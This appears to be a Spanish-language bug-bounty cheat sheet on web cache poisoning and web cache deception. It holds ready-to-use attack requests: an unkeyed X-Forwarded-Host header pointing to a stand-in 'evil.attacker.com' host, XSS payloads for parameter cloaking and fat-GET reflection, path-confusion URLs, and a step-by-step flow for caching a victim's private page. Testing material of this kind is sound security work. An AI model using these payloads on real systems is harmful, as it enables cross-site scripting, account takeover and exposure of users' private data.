---
title: "Cache Poisoning y Web Cache Deception"
description: "Dos caras de la misma moneda: ambas explotan discrepancias entre cache y servidor."
category: "Web"
date: 2026-07-18
---
# Cache Poisoning y Web Cache Deception

Dos caras de la misma moneda: ambas explotan discrepancias entre cache y servidor.

| Ataque | Objetivo | Mecanismo |
|--------|----------|-----------|
| **Cache Poisoning** | Envenenar el cache para todos los usuarios | Manipular inputs no claveados en la respuesta |
| **Cache Deception** | Engañar al cache para que almacene datos privados | Extensiones falsas de static files |

---

## Web Cache Poisoning

### Concepto

El cache key normalmente incluye: URL + Host + algunos headers. Cualquier input que se refleje en la respuesta pero **no esté en el cache key** permite envenenar.

### Unkeyed header poisoning

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.attacker.com
```

Si la respuesta usa `X-Forwarded-Host` para construir URLs, el cache guarda la página con recursos desde `evil.attacker.com` para todos los visitantes.

### Parameter cloaking

```http
GET /search?q=legit&q=<script>alert(1)</script>
```

El cache usa `q=legit` como key; el backend ve `q=<script>alert(1)</script>`.

### Fat GET / body reflection

```http
GET /page HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=<script>alert(1)</script>
```

Si el body se refleja en GET response y no está en el cache key → XSS almacenado en cache.

### Chaining unkeyed inputs

```http
# Paso 1: X-Forwarded-Host establece cookie con dominio malicioso
# Paso 2: X-Forwarded-Scheme: nothttps fuerza redirect
# Paso 3: Combinación produce Location: https://evil.attacker.com/en
```

---

## Web Cache Deception

Engañar al cache para que almacene la página autenticada de una víctima como si fuera un static file.

### Extension confusion

```
/account/settings/nonexistent.css
/account/profile/anything.js
/api/user/data/fake.png
/dashboard/test.woff2
```

La app ignora el `.css` y sirve la página autenticada. El cache lo trata como static y lo cachea.

### Path delimiter confusion

```
/account/settings;.css           # Java/Tomcat ignora después de ;
/account/settings%00.css         # Null byte truncation
/account/settings%23.css         # Fragment confusion (#)
/account/settings%3B.css         # ; encoded
```

### Path normalization

```
/account/settings/..%2F..%2Fstatic/logo.png
/account/settings/%2e%2e/static/logo.png
/my-account;%2f%2e%2e%2frobots.txt?wcd
```

### Ataque completo

```
1. Atacante envía link: https://target.com/account/settings/style.css
2. Víctima autenticada hace click
3. Cache: MISS → reenvía a backend
4. Backend: sirve datos de /account/settings (ignora .css)
5. Cache: HIT ahora (almacenó como static)
6. Atacante solicita la misma URL sin auth
7. Cache: HIT → sirve los datos de la víctima
```

---

## Detección

```bash
# Probar si hay cache
curl -I https://target.com | grep -i "x-cache\|cf-cache\|age\|cache-control"

# Param Miner (Burp) para detectar unkeyed inputs
# Extensión: Param Miner → Guess headers → detecta reflection

# Probar WCD
curl https://target.com/account/settings/test.css -H "Cookie: session=..."
curl -I https://target.com/account/settings/test.css  # Sin cookie → ¿X-Cache: HIT?

# Nuclei
nuclei -l alive.txt -t ~/nuclei-templates/vulnerabilities/cache-poisoning/
```

---

## Checklist de cache poisoning

- [ ] Headers no claveados: `X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Scheme`, `Origin`
- [ ] Parameter cloaking (duplicados)
- [ ] Body reflection en GET
- [ ] Cookie setting via unkeyed input
- [ ] Vary header analysis

## Checklist de cache deception

- [ ] Extension confusion: `/path/file.css`, `/path/file.js`
- [ ] Delimiters: `;`, `%00`, `%23`, `%3B`
- [ ] Normalization: `%2e%2e`, `..%2f`
- [ ] Probar sin cookie → ¿cache HIT?
- [ ] Verificar headers `X-Cache`, `CF-Cache-Status`, `Age`

---

## Reports públicos

- [Cache poisoning → XSS + ATO en Expedia](https://hackerone.com/reports/1760213)
- [Cache poisoning DoS en PayPal ($9,700)](https://hackerone.com/reports/622122)
- [WCD en plataforma e-commerce](https://hackerone.com/reports/1273855)
- [CVE-2025-4366: Cloudflare Pingora cache poisoning](https://zeropath.com/blog/cve-2025-4366-pingora-request-smuggling)

---

## Relacionado
- **Business Logic** — cache poisoning de precios/descuentos
- **Host Header Injection** — X-Forwarded-Host unkeyed poisoning
- **HTTP Request Smuggling** — desync → cache poisoning
- **Open Redirect**
- **SSRF** — blind SSRF vía cache poisoning
- **Subdomain Takeover y Recon Web** — WCD con path confusion
- **Claude-BugHunter** (skill `hunt-cache-poison`)
